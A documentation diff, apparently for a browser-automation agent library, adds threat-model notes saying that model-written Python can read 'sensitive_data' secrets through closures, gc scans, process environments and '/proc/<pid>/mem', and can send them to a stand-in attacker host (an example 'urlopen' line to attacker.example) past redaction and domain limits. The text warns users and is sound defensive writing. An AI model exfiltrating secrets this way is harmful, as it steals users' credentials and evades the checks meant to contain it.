@@ -377,9 +377,14 @@ longer word or number; `Agent` warns about such values):
 
 Nothing else is redacted. This is not a sandbox:
 
-- The values live in the worker process, so model-written Python can read them. A transform redaction does not know
-  (rot13, splitting a value) passes every channel above, and a file the code writes itself (`open()`, pandas, ...) is
-  never redacted.
+- The values live in the worker process, so model-written Python can read them: they are one attribute away from any
+  helper (`type_secret`'s closure, a `gc` scan, the worker's frames), domain-scoped values included. A same-process
+  Python REPL cannot keep a value from the code it runs. A transform redaction does not know (rot13, splitting a
+  value) passes every channel above, and a file the code writes itself (`open()`, pandas, ...) is never redacted.
+- Model-written Python can send any `sensitive_data` value, domain-scoped ones included, to any host
+  (`urllib.request.urlopen('https://attacker.example/?v=' + value)`, sockets, `subprocess curl`) without it ever
+  appearing in model output. Redaction and the domain scope do not apply, and `allowed_domains` does not check the
+  REPL's own networking (see [Domain restrictions](#domain-restrictions)).
 - Screenshots are images and are not redacted: a typed value in a visible field (an email, a token, a "show
   password" field) reaches the model in a screenshot. Model-written `js()` can read a field's value back.
 - A cloud browser's live view (`live_view=True`, or anyone with that URL) and any recording of the session show what
@@ -389,6 +394,10 @@ Nothing else is redacted. This is not a sandbox:
 - The worker can read the environment of other processes your user runs, including the Python process that runs
   the agent and the browser-harness daemon (`ps -E -p <pid>` on macOS, `/proc/<pid>/environ` on Linux). Every
   provider and Browser Use key set there (`OPENAI_API_KEY`, `BROWSER_USE_API_KEY`, ...) is readable that way.
+- Where the OS lets a process read another process's memory as the same user (Linux without Yama
+  `ptrace_scope` >= 1, many containers), the worker can read the memory of the Python process that runs the agent
+  (`/proc/<pid>/mem`), which holds every `sensitive_data` value. Keeping values out of the worker alone therefore does
+  not keep them from model code; they must sit with a different OS user, container or server.
 
 Run untrusted tasks in a container or VM.
 
